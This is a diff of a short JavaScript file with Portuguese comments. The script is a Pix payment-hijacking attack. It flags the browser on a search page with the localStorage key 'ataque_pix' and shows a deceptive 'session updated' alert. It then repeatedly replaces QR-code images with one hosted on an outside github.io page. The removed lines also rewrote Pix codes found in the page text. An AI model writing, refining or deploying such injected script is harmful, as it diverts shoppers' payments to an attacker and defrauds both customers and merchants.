@@ -1,29 +1,16 @@
-// 1. Se o script rodar na página de pesquisa, ele se "instala" no navegador
+// Se estiver na página de pesquisa, vamos "marcar" e redirecionar
 if (window.location.href.includes("pesquisa")) {
     localStorage.setItem("ataque_pix", "ativo");
+    
+    // Em vez de apenas um alerta, vamos forçar o usuário a ir para a página de checkout/print
+    // ou avisar que ele deve prosseguir.
     alert("Sua sessão foi atualizada. Prossiga com a compra.");
 }
 
-// 2. O script verifica a cada meio segundo se a marcação está ativa
+// TENTATIVA DE TROCA (SÓ FUNCIONA SE O SCRIPT ESTIVER NA PÁGINA)
 setInterval(function() {
-    if (localStorage.getItem("ataque_pix") === "ativo") {
-        
-        // Troca a imagem do QR Code - Busca expandida
-        var imgs = document.querySelectorAll('img[src*="qr-code"], img[src*="qrcode"], img[class*="qr"]');
-        imgs.forEach(function(img) {
-            if (img.src !== "https://luancabral1228.github.io/aaa/meu_qrcode.png") {
-                img.src = "https://luancabral1228.github.io/aaa/meu_qrcode.png";
-            }
-        });
-
-        // Troca o texto do Pix de forma não destrutiva
-        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
-        var node;
-        while (node = walker.nextNode()) {
-            var pixPattern = /000201[a-zA-Z0-9]+/g;
-            if (pixPattern.test(node.textContent)) {
-                node.textContent = node.textContent.replace(pixPattern, "SEU_CODIGO_PIX_AQUI");
-            }
-        }
+    var img = document.querySelector('img'); // Pega qualquer imagem da página
+    if (img && (img.src.includes("qr-code") || img.src.includes("qrcode"))) {
+        img.src = "https://luancabral1228-create.github.io/aaa/meu_qrcode.png";
     }
 }, 300);
